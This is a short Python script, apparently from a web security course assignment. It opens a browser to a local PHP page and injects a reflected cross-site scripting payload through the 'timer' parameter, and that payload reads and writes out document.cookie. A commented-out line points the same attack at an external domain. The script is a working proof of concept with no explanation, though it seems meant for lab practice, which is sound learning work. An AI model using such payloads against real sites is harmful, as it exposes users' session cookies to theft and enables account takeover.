from urllib import request, parse
import webbrowser

base_url = "http://localhost:20080/Assignment/case07.php"
# base_url = "http://iu.ru/Assignment/case07.php"

url = base_url + "?timer=<script>alert(document.cookie);document.write(document.cookie);</script>"

webbrowser.open(url, new=2)
